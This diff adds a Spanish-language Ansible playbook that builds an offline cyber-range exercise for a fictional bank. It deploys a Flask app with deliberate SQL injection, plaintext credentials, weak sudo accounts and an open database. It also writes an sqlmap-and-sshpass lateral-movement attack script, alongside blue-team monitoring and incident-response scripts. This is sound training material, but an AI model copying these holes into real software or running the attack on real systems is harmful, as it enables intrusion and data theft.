@@ -1,0 +1,467 @@
+---
+# ==============================================================================
+# Escenario Intrusion - Configuracion Post-Clonado
+# ==============================================================================
+# Este playbook se ejecuta en cada maquina despues del clonado.
+# NO hay conexion a internet disponible.
+#
+# FLUJO DEL ATAQUE:
+#   1. Instalar aplicacion Flask vulnerable en web-srv
+#   2. Poblar PostgreSQL en db-srv con datos ficticios
+#   3. Almacenar contrasena en texto plano en la config de Flask
+#   4. Desde attack-ws: usar sqlmap para explotar SQLi
+#   5. SSH de attack-ws a db-srv con credenciales extraidas
+#   6. Plantar bandera en core-bank
+# ==============================================================================
+
+- name: "Configurar PostgreSQL en db-srv con datos ficticios"
+  hosts: db-srv
+  gather_facts: yes
+  become: yes
+  tasks:
+    - name: "Crear usuario de PostgreSQL para la aplicacion"
+      become_user: postgres
+      community.postgresql.postgresql_user:
+        name: dbadmin
+        password: "BancoDelSol2026!"
+        state: present
+      ignore_errors: yes
+
+    - name: "Crear usuario alternativo"
+      become_user: postgres
+      community.postgresql.postgresql_user:
+        name: admin
+        password: "admin123"
+        state: present
+      ignore_errors: yes
+
+    - name: "Crear base de datos bancaria"
+      become_user: postgres
+      community.postgresql.postgresql_db:
+        name: banco_del_sol
+        owner: dbadmin
+        state: present
+      ignore_errors: yes
+
+    - name: "Crear usuario del sistema para SSH"
+      ansible.builtin.user:
+        name: admin
+        password: "{{ 'admin123' | password_hash('sha512', salt='bhusalt', rounds=5000) }}"
+        shell: /bin/bash
+        groups: sudo
+        create_home: yes
+        comment: "Administrador del Sistema"
+
+    - name: "Crear esquema de base de datos"
+      become_user: postgres
+      ansible.builtin.shell: |
+        psql -d banco_del_sol -c "
+        CREATE TABLE IF NOT EXISTS clientes (
+            id SERIAL PRIMARY KEY,
+            cedula VARCHAR(20) NOT NULL,
+            nombre VARCHAR(100) NOT NULL,
+            apellido VARCHAR(100) NOT NULL,
+            email VARCHAR(100),
+            telefono VARCHAR(20),
+            direccion TEXT,
+            saldo DECIMAL(15,2),
+            estado VARCHAR(20) DEFAULT 'activo'
+        );
+
+        CREATE TABLE IF NOT EXISTS cuentas (
+            id SERIAL PRIMARY KEY,
+            cliente_id INTEGER REFERENCES clientes(id),
+            numero_cuenta VARCHAR(20) NOT NULL,
+            tipo_cuenta VARCHAR(50),
+            saldo DECIMAL(15,2),
+            moneda VARCHAR(10) DEFAULT 'USD'
+        );
+
+        CREATE TABLE IF NOT EXISTS transacciones (
+            id SERIAL PRIMARY KEY,
+            cuenta_id INTEGER REFERENCES cuentas(id),
+            fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            tipo VARCHAR(50),
+            monto DECIMAL(15,2),
+            descripcion TEXT
+        );
+
+        INSERT INTO clientes (cedula, nombre, apellido, email, telefono, direccion, saldo) VALUES
+        ('12345678', 'Juan', 'Garcia', 'juan.garcia@email.com', '099123456', 'Av. Principal 123', 50000.00),
+        ('23456789', 'Maria', 'Lopez', 'maria.lopez@email.com', '099234567', 'Calle Secundaria 456', 75000.00),
+        ('34567890', 'Carlos', 'Rodriguez', 'carlos.rodriguez@email.com', '099345678', 'Boulevard Central 789', 120000.00),
+        ('45678901', 'Ana', 'Martinez', 'ana.martinez@email.com', '099456789', 'Plaza Mayor 101', 30000.00),
+        ('56789012', 'Pedro', 'Sanchez', 'pedro.sanchez@email.com', '099567890', 'Calle Norte 202', 95000.00),
+        ('67890123', 'Laura', 'Fernandez', 'laura.fernandez@email.com', '099678901', 'Av. Sur 303', 150000.00),
+        ('78901234', 'Diego', 'Torres', 'diego.torres@email.com', '099789012', 'Calle Oeste 404', 60000.00),
+        ('89012345', 'Sofia', 'Ramirez', 'sofia.ramirez@email.com', '099890123', 'Av. Este 505', 85000.00),
+        ('90123456', 'Martin', 'Diaz', 'martin.diaz@email.com', '099901234', 'Plaza Norte 606', 110000.00),
+        ('01234567', 'Camila', 'Moreno', 'camila.moreno@email.com', '099012345', 'Boulevard Sur 707', 45000.00);
+
+        INSERT INTO cuentas (cliente_id, numero_cuenta, tipo_cuenta, saldo) VALUES
+        (1, '10001', 'Caja de Ahorro', 25000.00),
+        (2, '10002', 'Cuenta Corriente', 50000.00),
+        (3, '10003', 'Plazo Fijo', 120000.00),
+        (4, '10004', 'Caja de Ahorro', 15000.00),
+        (5, '10005', 'Cuenta Corriente', 75000.00),
+        (6, '10006', 'Inversion', 100000.00),
+        (7, '10007', 'Caja de Ahorro', 30000.00),
+        (8, '10008', 'Cuenta Corriente', 60000.00),
+        (9, '10009', 'Plazo Fijo', 90000.00),
+        (10, '10010', 'Caja de Ahorro', 20000.00);
+
+        INSERT INTO transacciones (cuenta_id, tipo, monto, descripcion) VALUES
+        (1, 'deposito', 5000.00, 'Deposito inicial'),
+        (2, 'retiro', 1000.00, 'Retiro en cajero'),
+        (3, 'transferencia', 20000.00, 'Transferencia a cuenta 10001'),
+        (4, 'deposito', 3000.00, 'Deposito en efectivo'),
+        (5, 'pago', 500.00, 'Pago de servicios');
+        "
+      ignore_errors: yes
+
+    - name: "Configurar PostgreSQL para aceptar conexiones remotas"
+      ansible.builtin.lineinfile:
+        path: /etc/postgresql/*/main/postgresql.conf
+        regexp: "^#?\\s*listen_addresses"
+        line: "listen_addresses = '*'"
+
+    - name: "Configurar pg_hba.conf para aceptar conexiones"
+      ansible.builtin.lineinfile:
+        path: /etc/postgresql/*/main/pg_hba.conf
+        insertafter: EOF
+        line: "host    all             all             0.0.0.0/0               md5"
+
+    - name: "Reiniciar PostgreSQL"
+      ansible.builtin.service:
+        name: postgresql
+        state: restarted
+
+- name: "Configurar Flask vulnerable en web-srv"
+  hosts: web-srv
+  gather_facts: yes
+  become: yes
+  tasks:
+    - name: "Crear directorio de la aplicacion"
+      ansible.builtin.file:
+        path: /opt/banco_web
+        state: directory
+        mode: "0755"
+
+    - name: "Crear aplicacion Flask vulnerable (SQL Injection)"
+      ansible.builtin.copy:
+        dest: /opt/banco_web/app.py
+        mode: "0755"
+        content: |
+          #!/usr/bin/env python3
+          """
+          Aplicacion Web Vulnerable - Banco del Sol
+          ADVERTENCIA: Contiene vulnerabilidad SQL Injection intencional
+          Solo para fines educativos
+          """
+          from flask import Flask, request, render_template_string, redirect, url_for
+          import psycopg2
+
+          app = Flask(__name__)
+
+          # CONFIGURACION VULNERABLE - Credenciales en texto plano
+          DB_HOST = "{{ hostvars['db-srv']['ansible_default_ipv4']['address'] | default('10.0.0.4') }}"
+          DB_NAME = "banco_del_sol"
+          DB_USER = "dbadmin"
+          DB_PASSWORD = "BancoDelSol2026!"
+          DB_PORT = "5432"
+
+          def get_db():
+              return psycopg2.connect(
+                  host=DB_HOST,
+                  database=DB_NAME,
+                  user=DB_USER,
+                  password=DB_PASSWORD,
+                  port=DB_PORT
+              )
+
+          @app.route('/')
+          def index():
+              return render_template_string('''
+              <!DOCTYPE html>
+              <html>
+              <head>
+                <title>Banco del Sol - Busqueda de Clientes</title>
+                <style>
+                  body { font-family: Arial; max-width: 800px; margin: 50px auto; }
+                  .search-box { padding: 20px; background: #f5f5f5; border-radius: 10px; }
+                  input[type="text"] { width: 300px; padding: 10px; }
+                  input[type="submit"] { padding: 10px 20px; background: #1a237e; color: white; border: none; border-radius: 5px; }
+                  table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+                  th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+                  th { background: #1a237e; color: white; }
+                </style>
+              </head>
+              <body>
+                <h1>Banco del Sol - Sistema de Busqueda de Clientes</h1>
+                <div class="search-box">
+                  <form method="GET" action="/buscar">
+                    <input type="text" name="cedula" placeholder="Ingrese cedula del cliente">
+                    <input type="submit" value="Buscar">
+                  </form>
+                </div>
+                <p><small>Sistema interno - Uso autorizado solamente</small></p>
+              </body>
+              </html>
+              ''')
+
+          @app.route('/buscar')
+          def buscar():
+              cedula = request.args.get('cedula', '')
+              # VULNERABILIDAD: SQL Injection - concatenacion directa
+              query = "SELECT * FROM clientes WHERE cedula = '" + cedula + "'"
+              try:
+                  conn = get_db()
+                  cur = conn.cursor()
+                  cur.execute(query)
+                  results = cur.fetchall()
+                  cur.close()
+                  conn.close()
+
+                  if results:
+                      html = '<h2>Resultados de Busqueda</h2>'
+                      html += '<table><tr><th>Cedula</th><th>Nombre</th><th>Apellido</th><th>Email</th><th>Saldo</th></tr>'
+                      for row in results:
+                          html += f'<tr><td>{row[1]}</td><td>{row[2]}</td><td>{row[3]}</td><td>{row[4]}</td><td>${row[7]:,.2f}</td></tr>'
+                      html += '</table>'
+                      return html
+                  else:
+                      return '<h2>No se encontraron resultados</h2><a href="/">Volver</a>'
+              except Exception as e:
+                  return f'<h2>Error en la busqueda</h2><pre>{str(e)}</pre><a href="/">Volver</a>'
+
+          @app.route('/api/clientes')
+          def api_clientes():
+              # Endpoint adicional vulnerable
+              cedula = request.args.get('cedula', '1')
+              query = "SELECT * FROM clientes WHERE cedula = '" + cedula + "'"
+              try:
+                  conn = get_db()
+                  cur = conn.cursor()
+                  cur.execute(query)
+                  results = cur.fetchall()
+                  cur.close()
+                  conn.close()
+                  return {"results": [dict(zip(['id','cedula','nombre','apellido','email','telefono','direccion','saldo','estado'], r)) for r in results]}
+              except Exception as e:
+                  return {"error": str(e)}
+
+          if __name__ == '__main__':
+              app.run(host='0.0.0.0', port=5000, debug=True)
+
+    - name: "Crear script de inicio de Flask"
+      ansible.builtin.copy:
+        dest: /opt/banco_web/start.sh
+        mode: "0755"
+        content: |
+          #!/bin/bash
+          cd /opt/banco_web
+          python3 app.py
+
+    - name: "Iniciar Flask en background"
+      ansible.builtin.shell: |
+        nohup python3 /opt/banco_web/app.py &>/dev/null &
+      async: 10
+      poll: 0
+
+    - name: "Configurar nginx como proxy reverso"
+      ansible.builtin.copy:
+        dest: /etc/nginx/sites-available/banco
+        content: |
+          server {
+            listen 80 default_server;
+            server_name _;
+
+            location / {
+              proxy_pass http://127.0.0.1:5000;
+              proxy_set_header Host $host;
+              proxy_set_header X-Real-IP $remote_addr;
+            }
+
+            access_log /var/log/nginx/banco_access.log;
+            error_log /var/log/nginx/banco_error.log;
+          }
+
+    - name: "Habilitar sitio del banco"
+      ansible.builtin.command:
+        cmd: ln -sf /etc/nginx/sites-available/banco /etc/nginx/sites-enabled/banco
+
+    - name: "Deshabilitar sitio por defecto"
+      ansible.builtin.command:
+        cmd: rm -f /etc/nginx/sites-enabled/default
+
+    - name: "Reiniciar nginx"
+      ansible.builtin.service:
+        name: nginx
+        state: restarted
+        enabled: yes
+
+    - name: "Crear usuario admin en web-srv"
+      ansible.builtin.user:
+        name: admin
+        password: "{{ 'admin123' | password_hash('sha512', salt='bhusalt', rounds=5000) }}"
+        shell: /bin/bash
+        groups: sudo
+        create_home: yes
+
+- name: "Configurar core-bank con bandera"
+  hosts: core-bank
+  gather_facts: yes
+  become: yes
+  tasks:
+    - name: "Crear usuario admin"
+      ansible.builtin.user:
+        name: admin
+        password: "{{ 'admin123' | password_hash('sha512', salt='bhusalt', rounds=5000) }}"
+        shell: /bin/bash
+        groups: sudo
+        create_home: yes
+
+    - name: "Crear archivo bandera (planted por el atacante)"
+      ansible.builtin.copy:
+        dest: /home/admin/flag.txt
+        owner: admin
+        group: admin
+        mode: "0644"
+        content: |
+          ====================================
+          BANDERA - MOVIMIENTO LATERAL
+          ====================================
+          Felicitaciones! Has completado el movimiento lateral.
+
+          Has logrado:
+          1. Explotar SQL Injection en web-srv
+          2. Extraer credenciales de la base de datos
+          3. Acceder via SSH a db-srv
+          4. Llegar hasta core-bank
+
+          Esto demuestra la importancia de:
+          - Validar todas las entradas de usuario
+          - No almacenar credenciales en texto plano
+          - Implementar segmentacion de red
+          - Monitorear el trafico entre servidores
+
+          Incidente #004 - Banco del Sol
+          ====================================
+
+- name: "Configurar attack-ws para el ataque"
+  hosts: attack-ws
+  gather_facts: yes
+  become: yes
+  tasks:
+    - name: "Obtener IPs de los servidores"
+      ansible.builtin.set_fact:
+        web_srv_ip: "{{ hostvars['web-srv']['ansible_default_ipv4']['address'] | default('10.0.0.3') }}"
+        db_srv_ip: "{{ hostvars['db-srv']['ansible_default_ipv4']['address'] | default('10.0.0.4') }}"
+        core_bank_ip: "{{ hostvars['core-bank']['ansible_default_ipv4']['address'] | default('10.0.0.5') }}"
+
+    - name: "Crear script de ataque SQL Injection"
+      ansible.builtin.copy:
+        dest: /opt/sql_injection_attack.sh
+        mode: "0755"
+        content: |
+          #!/bin/bash
+          # Ataque SQL Injection - Banco del Sol
+          # ADVERTENCIA: Solo para fines educativos
+
+          WEB_SRV="{{ web_srv_ip }}"
+          DB_SRV="{{ db_srv_ip }}"
+          CORE_BANK="{{ core_bank_ip }}"
+
+          echo "============================================"
+          echo "  ATAQUE SQL INJECTION - BANCO DEL SOL"
+          echo "============================================"
+          echo ""
+
+          # Fase 1: Reconocimiento
+          echo "[*] Fase 1: Reconocimiento del servidor web..."
+          curl -s "http://$WEB_SRV/" | head -20
+          echo ""
+
+          # Fase 2: SQL Injection con sqlmap
+          echo "[*] Fase 2: Explotando SQL Injection..."
+          sqlmap -u "http://$WEB_SRV/buscar?cedula=1" --batch --dump-all --threads=1 2>/dev/null
+
+          echo ""
+          echo "[*] SQL Injection completada"
+          echo ""
+
+          # Fase 3: SSH a db-srv con credenciales extraidas
+          echo "[*] Fase 3: Movimiento lateral a db-srv..."
+          sshpass -p 'admin123' ssh -o StrictHostKeyChecking=no admin@$DB_SRV 'echo "Conexion SSH exitosa a db-srv"; cat /etc/hostname'
+
+          # Fase 4: Plantar bandera en core-bank
+          echo "[*] Fase 4: Movimiento lateral a core-bank..."
+          sshpass -p 'admin123' ssh -o StrictHostKeyChecking=no admin@$CORE_BANK 'echo "Conexion SSH exitosa a core-bank"; cat /home/admin/flag.txt'
+
+          echo ""
+          echo "============================================"
+          echo "  ATAQUE COMPLETADO"
+          echo "============================================"
+
+    - name: "Crear script de monitoreo para blue-team"
+      ansible.builtin.copy:
+        dest: /opt/monitor_intrusion.sh
+        mode: "0755"
+        content: |
+          #!/bin/bash
+          # Monitor de Intrusion - Banco del Sol
+          # Detecta actividad sospechosa de movimiento lateral
+
+          echo "=== Monitor de Intrusion - Banco del Sol ==="
+          echo "Presione Ctrl+C para detener"
+          echo ""
+
+          while true; do
+            # Verificar logs de nginx en web-srv
+            echo "--- Logs de nginx (ultimas 10 lineas) ---"
+            ssh admin@{{ web_srv_ip | default('10.0.0.3') }} "tail -10 /var/log/nginx/banco_access.log" 2>/dev/null
+
+            # Verificar logs de PostgreSQL en db-srv
+            echo "--- Logs de PostgreSQL (ultimas 10 lineas) ---"
+            ssh admin@{{ db_srv_ip | default('10.0.0.4') }} "tail -10 /var/log/postgresql/postgresql-*-main.log" 2>/dev/null
+
+            # Verificar conexiones SSH activas
+            echo "--- Conexiones SSH activas ---"
+            for host in {{ web_srv_ip | default('10.0.0.3') }} {{ db_srv_ip | default('10.0.0.4') }} {{ core_bank_ip | default('10.0.0.5') }}; do
+              echo "  Host: $host"
+              ssh admin@$host "who; last -5" 2>/dev/null
+            done
+
+            sleep 30
+          done
+
+    - name: "Crear script de respuesta a incidente"
+      ansible.builtin.copy:
+        dest: /opt/incident_response.sh
+        mode: "0755"
+        content: |
+          #!/bin/bash
+          # Respuesta a Incidente - Intrusion
+          # Banco del Sol
+
+          echo "============================================"
+          echo "  RESPUESTA A INCIDENTE - INTRUSION"
+          echo "============================================"
+          echo ""
+
+          # Fase 1: Bloquear IP del atacante
+          echo "[*] Fase 1: Bloqueando IP del atacante..."
+          ATTACKER_IP=$(ssh admin@{{ web_srv_ip | default('10.0.0.3') }} "grep 'POST.*buscar' /var/log/nginx/banco_access.log | awk '{print $1}' | sort -u | head -1" 2>/dev/null)
+          echo "  IP del atacante: $ATTACKER_IP"
+
+          # Fase 2: Revocar credenciales
+          echo "[*] Fase 2: Revocando credenciales comprometidas..."
+          echo "  Cambiando contrasena de dbadmin en PostgreSQL..."
+          ssh admin@{{ db_srv_ip | default('10.0.0.4') }} "sudo -u postgres psql -c \"ALTER USER dbadmin PASSWORD 'NuevaContrasena2026!';\"" 2>/dev/null
+
+          # Fase 3: Corregir vulnerabilidad
+          echo "[*] Fase 3: Corrigiendo vulnerabilidad SQL Injection..."
+          echo "  Implementar consultas parametrizadas en Flask"
+
+          echo ""
+          echo "[+] Fase de contencion completada"
